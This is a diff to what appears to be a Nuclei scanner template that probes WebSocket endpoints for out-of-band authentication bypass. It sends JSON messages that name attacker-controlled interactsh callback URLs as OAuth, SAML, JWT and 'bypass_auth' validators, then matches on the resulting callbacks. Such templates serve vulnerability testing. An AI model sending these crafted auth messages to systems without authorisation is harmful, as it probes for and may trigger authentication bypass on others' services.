@@ -20,17 +20,11 @@ info:
   - https://tools.ietf.org/html/rfc6455#section-10
   severity: high
   tags: websocket,oob,auth-bypass,jwt,oauth,delegation
-matchers:
-- condition: or
-  part: interactsh_protocol
-  type: word
-  words:
-  - http
-  - dns
 variables:
   callback_url: '{{interactsh-url}}'
+  ws_base: '{{replace(replace(BaseURL, ''https://'', ''wss://''), ''http://'', ''ws://'')}}'
 websocket:
-- address: '{{BaseURL}}'
+- address: '{{ws_base}}{{ws_path}}'
   inputs:
   - data: "{\n  \"type\": \"auth\",\n  \"auth_type\": \"external\",\n  \"validation_url\"\
       : \"{{callback_url}}/validate\",\n  \"callback_url\": \"{{callback_url}}/auth-success\"\
@@ -42,12 +36,31 @@ websocket:
       ,\n  \"authorization_url\": \"{{callback_url}}/oauth/authorize\",\n  \"token_url\"\
       : \"{{callback_url}}/oauth/token\",\n  \"redirect_uri\": \"{{callback_url}}/oauth/callback\"\
       \n}\n"
-  path:
-  - /ws
-  - /websocket
-  - /socket.io/
-  - /api/ws
-- address: '{{BaseURL}}'
+  matchers:
+  - condition: or
+    part: interactsh_protocol
+    type: word
+    words:
+    - http
+    - dns
+  - condition: or
+    part: interactsh_request
+    type: word
+    words:
+    - validate
+    - auth-success
+    - jwt/validate
+    - oauth/authorize
+    - oauth/token
+    - oauth/callback
+  matchers-condition: and
+  payloads:
+    ws_path:
+    - /ws
+    - /websocket
+    - /socket.io/
+    - /api/ws
+- address: '{{ws_base}}{{ws_path}}'
   inputs:
   - data: "{\n  \"type\": \"delegate_auth\",\n  \"auth_delegate\": \"{{callback_url}}/auth\"\
       ,\n  \"user_info_url\": \"{{callback_url}}/userinfo\",\n  \"trust_external\"\
@@ -57,7 +70,28 @@ websocket:
       ,\n  \"acs_url\": \"{{callback_url}}/saml/acs\"\n}\n"
   - data: "{\n  \"command\": \"bypass_auth\",\n  \"external_validator\": \"{{callback_url}}/bypass\"\
       ,\n  \"callback_url\": \"{{callback_url}}/bypassed\"\n}\n"
-  path:
-  - /ws/auth
-  - /websocket/authenticate
-  - /api/ws/login
+  matchers:
+  - condition: or
+    part: interactsh_protocol
+    type: word
+    words:
+    - http
+    - dns
+  - condition: or
+    part: interactsh_request
+    type: word
+    words:
+    - auth
+    - userinfo
+    - authenticated
+    - saml/sso
+    - saml/metadata
+    - saml/acs
+    - bypass
+    - bypassed
+  matchers-condition: and
+  payloads:
+    ws_path:
+    - /ws/auth
+    - /websocket/authenticate
+    - /api/ws/login
